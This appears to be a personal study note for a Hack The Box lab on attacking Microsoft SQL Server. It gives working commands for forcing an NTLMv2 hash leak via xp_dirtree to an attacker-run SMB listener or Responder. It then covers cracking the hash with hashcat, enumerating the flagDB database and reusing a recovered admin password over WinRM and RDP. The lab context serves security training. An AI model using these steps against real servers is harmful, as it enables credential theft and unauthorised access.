---
tags: [lab, attack/network]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — MSSQL: Hash Theft and Database Enumeration

Two-question lab: steal the MSSQL service account's NTLMv2 hash via xp_dirtree, crack it to answer Q1, then log in and enumerate the flagDB schema to find encrypted data and submit the flag for Q2.

## Questions

1. What is the password for the `mssqlsvc` account?
2. Enumerate the `flagDB` database and submit the flag as the answer.

## Attack Overview

The two questions chain together. Q1 produces credentials that give you higher-privilege access to the SQL server; Q2 uses that access to dig through a non-default database and find the flag hidden in encrypted data.

```
Initial low-priv SQL access
        │
        ▼
xp_dirtree → Responder captures NTLMv2 hash
        │
        ▼
hashcat cracks hash → mssqlsvc cleartext password  ← Q1 answer
        │
        ▼
Reconnect as mssqlsvc → enumerate databases → find flagDB
        │
        ▼
Schema walk: list tables → inspect columns → read encrypted data
        │
        ▼
Flag (or admin password → login → flag)            ← Q2 answer
```

---

## Phase 1: Initial Access and Recon

```bash
# Port scan
sudo nmap -sV -sC -p 1433 10.129.x.x
```

Connect with whichever client is available. Try them in order — mssqlclient.py is the most reliable from Linux.

### mssqlclient.py (Impacket) — preferred on Linux

```bash
# SQL Server authentication
mssqlclient.py -p 1433 <user>:<password>@10.129.x.x

# Windows / domain authentication
mssqlclient.py -p 1433 -windows-auth DOMAIN/<user>:<password>@10.129.x.x
```

Gives an `SQL>` prompt. Type SQL and press Enter — results appear immediately, no `GO` needed.

### sqsh — Linux alternative

```bash
# SQL Server authentication
sqsh -S 10.129.x.x -U <user> -P '<password>' -h

# Windows / domain authentication
sqsh -S 10.129.x.x -U 'DOMAIN\<user>' -P '<password>' -h
```

sqsh uses **batch mode** — nothing executes until you type `GO` on its own line. The numbered prompts (`1>`, `2>`) are normal. If you get stuck mid-batch, type `\reset` to clear the buffer.

```
1> SELECT SYSTEM_USER
2> GO
```

### sqlcmd — native Windows client, or Linux with mssql-tools installed

```bash
# Linux (requires mssql-tools18 — see installation in attack/sql_databases)
sqlcmd -S 10.129.x.x -U <user> -P '<password>' -y 30 -Y 30

# Windows
sqlcmd -S SRVMSSQL -U <user> -P '<password>' -y 30 -Y 30
```

sqlcmd also uses batch mode — type `GO` on its own line to execute. The `-y 30 -Y 30` flags prevent column output from being truncated.

---

First-login checklist (same SQL regardless of client):

```sql
SELECT SYSTEM_USER;                      -- who am I?
SELECT IS_SRVROLEMEMBER('sysadmin');     -- 0 = not sysadmin
SELECT name FROM master.dbo.sysdatabases;  -- what databases exist?
```

When `IS_SRVROLEMEMBER` returns 0, you cannot run `xp_cmdshell` yet. You have two escalation options: IMPERSONATE (if another user has it granted) and hash theft via xp_dirtree. Hash theft works regardless of your current privilege level — you only need the ability to execute stored procedures, which any authenticated SQL user can do.

---

## Phase 2: NTLMv2 Hash Theft — Capturing mssqlsvc's Password (Q1)

### The core mechanism

`xp_dirtree` is a built-in MSSQL stored procedure that lists child directories under a given path. When you point it at a UNC path (`\\IP\share`), the SQL Server makes an outbound **SMB connection** to that IP. Windows handles that connection using NTLM authentication automatically — the SQL Server process sends the service account's NTLMv2 hash as part of the handshake, before it even knows whether the share exists.

You are not reading files from a share. You are causing the SQL server to emit a credential over the network, which you intercept.

### What the UNC path actually is

The IP in `\\PWNIP\share` is **your attacker machine**, not a path on the target. The share name (`share`, `fake`, `anything`) does not matter — it never has to exist. Responder pretends to be an SMB server on your machine and responds to any connection attempt, capturing the NTLMv2 hash that Windows sends as part of the authentication handshake.

You do not need to find a real share on the target. You are building the fake SMB listener yourself.

### Why you need two terminal tabs

Responder must be a **running listener** before you trigger the outbound connection from SQL. The sequence is:

1. Start Responder (it blocks, waiting for incoming connections)
2. Trigger `xp_dirtree` in your SQL session
3. Responder captures the hash as it arrives

These are simultaneous — the listener must already be running when the SQL server reaches out. One terminal cannot be both the SQL client and the SMB listener at the same time.

**Tab 1 — start your SMB listener, leave it running.**

You have two options. Pick one based on the context below.

#### Option A: impacket-smbserver

```bash
sudo impacket-smbserver share ./ -smb2support
```

What it does: starts a minimal SMB server in the current directory, listening on port 445. When the MSSQL server connects to it, impacket logs the NTLMv2 hash to the terminal.

Output looks like:

```
[*] Incoming connection (10.129.x.x, 49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc, WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully
[*] mssqlsvc::WINSRV02:aad3b435...<full NTLMv2 hash>
```

#### Option B: Responder

```bash
sudo responder -I tun0
```

What it does: starts an SMB listener AND simultaneously poisons LLMNR/NBT-NS/mDNS broadcast name resolution on the interface. Any Windows machine on the network that broadcasts a hostname lookup will get a poisoned response pointing back to you, forcing authentication against your fake SMB server.

Output looks like:

```
[SMB] NTLMv2-SSP Username : WINSRV02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WINSRV02:aad3...:<full hash>
```

#### Responder vs impacket-smbserver — when to use which

| | impacket-smbserver | Responder |
|---|---|---|
| **What it listens for** | Only explicit SMB connections to your IP | SMB connections + broadcast LLMNR/NBT-NS/mDNS |
| **Scope** | Only the machine you target with xp_dirtree | Any machine on the network that broadcasts a failed name lookup |
| **Noise level** | Low — one targeted connection | High — can capture hashes from many machines simultaneously |
| **Best for** | xp_dirtree against a specific MSSQL server; file sharing during exploitation | Broad internal network recon; opportunistic hash capture across many hosts |
| **HTB / VPN labs** | Either works — tun0 only connects you to the target anyway | Either works, but LLMNR poisoning has no effect since there's no broadcast domain |
| **Real engagements** | Use when you want surgical precision — only one machine connects to you | Use during internal recon sweeps, but be aware it's loud and may alert defenders |

**For this lab, use impacket-smbserver** — it's what the HTB module demonstrates and it's the cleaner option when you're targeting a single machine. Use Responder when you want to passively harvest credentials from a whole subnet.

---

**Tab 2 — connect to MSSQL and trigger xp_dirtree:**

```sql
EXEC master..xp_dirtree '\\10.10.14.X\share\';
GO
```

Replace `10.10.14.X` with your `tun0` IP (`ip addr show tun0`). The share name (`share`) is arbitrary — it does not need to exist on your machine.

Tab 1 will log the captured hash. Copy the full hash line (starting with `mssqlsvc::`) and save it to `hash.txt`.

```bash
# Confirm your tun0 IP before running xp_dirtree
ip addr show tun0
```

Save the hash to a file (`hash.txt`) and crack it:

```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

The cracked output is the cleartext password for `mssqlsvc` — **Q1 answer**.

### How do you know to do this instead of just looking for secrets in the database?

Use this technique when all three of these are true:

| Signal | What it means |
|--------|--------------|
| `IS_SRVROLEMEMBER('sysadmin')` returns 0 | You cannot run xp_cmdshell or read the flag directly |
| `SELECT SYSTEM_USER` returns a service account like `mssqlsvc` | The running account has an OS-level credential worth stealing |
| Direct database enumeration turns up nothing useful | The data you need isn't sitting in a table you can read |

The insight is that the credential you want is **not in the database** — it's the OS-level password of the account running the SQL process. xp_dirtree is the mechanism for extracting it.

Also: try IMPERSONATE first (it's faster and requires no listener). If the IMPERSONATE query returns no results, move to hash theft.

---

## Phase 3: Reconnect as mssqlsvc

```bash
mssqlclient.py -p 1433 mssqlsvc:<crackedpassword>@10.129.x.x
```

Verify elevation:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');   -- should return 1 now
SELECT name FROM master.dbo.sysdatabases;
```

You should now see `flagDB` in the database list.

---

## Phase 4: Schema Enumeration of flagDB (Q2)

### Why enumerate schema before reading data?

You don't know the structure of flagDB — how many tables it has, what they're named, or what columns hold interesting data. Schema enumeration is how you build a map of the database before you touch any actual data.

**INFORMATION_SCHEMA** is a read-only system view built into every SQL database. It acts as a catalog — it describes the database's own structure. You're not reading business data; you're reading metadata *about* the database, which is always available to authenticated users regardless of whether they have SELECT access to the underlying tables.

The pattern is always: databases → tables → columns → data.

### Step 1: Switch to flagDB and list tables

```sql
USE flagDB;
GO

SELECT table_name
FROM INFORMATION_SCHEMA.TABLES
WHERE table_type = 'BASE TABLE';
GO
```

This lists every real table in flagDB. System views and temp tables are excluded by `table_type = 'BASE TABLE'`. Look for anything that sounds like it holds user data, credentials, or config.

### Step 2: Inspect column structure before reading

Before running `SELECT * FROM <table>`, check what columns exist. This matters because:
- Tables can have hundreds of columns — knowing which ones are relevant saves time
- Column data types tell you what format the data is in (varchar = plaintext, varbinary = binary/encrypted, nvarchar = Unicode text)
- Column names often reveal intent: `encrypted_password`, `hash`, `secret`, `token`

```sql
SELECT column_name, data_type
FROM INFORMATION_SCHEMA.COLUMNS
WHERE table_name = '<tablename>';
GO
```

### Step 3: When to look at permissions and metadata

Look at permissions metadata when:
- You can see a table exists in INFORMATION_SCHEMA but `SELECT * FROM table` returns an access denied error
- You want to know what a specific account can do without trying every operation blind

```sql
-- What can the current user do on this table?
SELECT HAS_PERMS_BY_NAME('flagDB.<schema>.<tablename>', 'OBJECT', 'SELECT');
-- 1 = yes, 0 = no

-- What objects does the current user have any permissions on?
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

If you can see a table name but can't read it, check whether another login (e.g., after IMPERSONATE) would have access before escalating further.

### Step 4: Read the data — find the encrypted credential

```sql
SELECT * FROM <tablename>;
GO
```

You will find a row containing encrypted data — this is the admin password in obfuscated form. How it's stored determines how you use it:

| What you see | What to do |
|-------------|-----------|
| A long hex string (e.g., `0x4D53...`) | Try casting: `SELECT CAST(column AS VARCHAR(MAX))` or `CONVERT(VARCHAR, column, 1)` |
| A base64-looking string | Decode externally or try `sys.fn_varbintohexstr` |
| A readable password in a column named `password` or `encrypted_password` | Use it directly |
| Something that looks like a hash | Feed to hashcat — the format (32 hex chars = MD5, 64 = SHA256, etc.) tells you the mode |

In this lab the encrypted value resolves directly to a usable password — try it as-is against the service (WinRM, RDP, or another SQL login) before attempting further decryption.

### Step 5: Use the recovered password

If the decrypted/found credential is for a Windows account:

```bash
# Try WinRM (port 5985)
evil-winrm -i 10.129.x.x -u Administrator -p '<recovered_password>'

# Try RDP (port 3389)
xfreerdp /v:10.129.x.x /u:Administrator /p:'<recovered_password>'

# Try logging in as a different SQL user
mssqlclient.py -p 1433 Administrator:<recovered_password>@10.129.x.x
```

Once in, the flag is either returned directly by the SQL query or is a file at a known path (e.g., `C:\Users\Administrator\Desktop\flag.txt` via xp_cmdshell).

---

## Key Concepts Summary

| Concept | One-line explanation |
|---------|---------------------|
| xp_dirtree | Built-in MSSQL proc that triggers an outbound SMB auth when pointed at a UNC path |
| NTLMv2 hash | The credential Windows sends automatically during SMB authentication — crackable offline |
| impacket-smbserver | Minimal SMB listener; captures hashes from explicit connections only — best for targeted xp_dirtree attacks |
| Responder | SMB listener + LLMNR/NBT-NS poisoner; captures hashes from the whole subnet — best for broad internal recon |
| UNC path (`\\IP\share`) | Your attacker IP + any share name — the share does not need to exist on your machine |
| Two terminals | SMB listener must be running *before* you trigger xp_dirtree — they run simultaneously |
| INFORMATION_SCHEMA | Built-in read-only catalog describing database structure; available to all authenticated users |
| Schema walk order | databases → tables (INFORMATION_SCHEMA.TABLES) → columns (INFORMATION_SCHEMA.COLUMNS) → data |
| hashcat mode 5600 | NTLMv2 hash cracking mode |

## Related Pages

- [[attack/sql_databases]] — xp_dirtree, xp_cmdshell, IMPERSONATE, file read/write techniques
- [[enumeration/mssql]] — pre-attack enumeration and initial access
- [[tools/attack/responder]] — LLMNR/SMB listener; captures NTLMv2 hashes
- [[tools/utility/impacket]] — mssqlclient.py
- [[definitions/auth_protocols]] — how NTLMv2 challenge-response works

## Sources

- raw/attacking_common_services/sql_attacking_sql_databases.md
